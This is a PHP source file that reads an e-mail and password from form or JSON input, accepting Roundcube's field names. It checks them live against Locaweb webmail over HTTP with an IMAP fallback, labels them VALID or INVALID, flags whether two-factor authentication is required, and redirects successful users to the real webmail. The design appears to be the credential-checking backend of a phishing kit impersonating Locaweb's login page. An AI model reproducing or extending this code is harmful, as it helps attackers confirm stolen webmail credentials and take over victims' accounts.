<?php
declare(strict_types=1);

require_once __DIR__ . '/locaweb_messages.php';
require_once __DIR__ . '/webmail_validate.php';
require_once __DIR__ . '/webmail_redirect.php';
require_once __DIR__ . '/locaweb_webmail_http.php';

/**
 * Extrai e-mail e senha do POST/JSON (suporta email/password e _user/_pass Roundcube).
 *
 * @return array{email:string,password:string}
 */
function locaweb_api_read_credentials(): array
{
    $input = $_POST;

    $raw = file_get_contents('php://input');
    if ($raw !== false && $raw !== '' && str_starts_with(trim($raw), '{')) {
        $json = json_decode($raw, true);
        if (is_array($json)) {
            $input = array_merge($input, $json);
        }
    }

    $email = trim((string) ($input['email'] ?? $input['_user'] ?? ''));
    $password = (string) ($input['password'] ?? $input['_pass'] ?? '');

    return ['email' => $email, 'password' => $password];
}

/**
 * Valida e-mail/senha via API Locaweb (HTTP + IMAP fallback) — mesma resposta do index.
 *
 * @return array{status:int,payload:array<string,mixed>}
 */
function locaweb_api_verify_login(string $email, string $password, array $config, bool $includeRedirect = true): array
{
    if ($email === '') {
        return [
            'status' => 400,
            'payload' => locaweb_login_json(false, 'emptyemail', 'warning', null, 'empty_email'),
        ];
    }

    if ($password === '') {
        return [
            'status' => 400,
            'payload' => locaweb_login_json(false, 'emptypass', 'warning', null, 'empty_password'),
        ];
    }

    $validation = webmail_validate_credentials($email, $password);
    if (!$validation['ok']) {
        $msgKey = (string) ($validation['message'] ?: 'invalid_login');
        if (!array_key_exists($msgKey, locaweb_messages())) {
            $msgKey = 'invalid_login';
        }

        return [
            'status' => 400,
            'payload' => array_merge(
                locaweb_login_json(false, $msgKey, 'warning', null, $msgKey),
                ['result' => 'INVALID_FORMAT', 'email' => $email]
            ),
        ];
    }

    $check = locaweb_verify_credentials_full($email, $password, $config);

    if (!$check['ok']) {
        $msgKey = (string) ($check['message_key'] ?? 'wrong_password');
        if (!array_key_exists($msgKey, locaweb_messages())) {
            $msgKey = 'wrong_password';
        }

        $payload = array_merge(
            locaweb_login_json(false, $msgKey, 'warning', null, 'invalid_credentials'),
            [
                'result' => 'INVALID',
                'email'  => $email,
                'source' => $check['source'] ?? 'unknown',
            ]
        );
        if (!empty($check['text'])) {
            $payload['text'] = (string) $check['text'];
        }

        return [
            'status' => 401,
            'payload' => $payload,
        ];
    }

    $redirect = $includeRedirect ? webmail_success_redirect($config) : null;
    $payload = array_merge(
        locaweb_login_json(true, 'success', 'success', $redirect),
        [
            'result'       => 'VALID',
            'email'        => $email,
            'source'       => $check['source'] ?? 'webmail_http',
            'requires_2fa' => !empty($check['requires_2fa']),
        ]
    );

    return ['status' => 200, 'payload' => $payload];
}

function locaweb_api_json_response(int $status, array $payload): never
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}
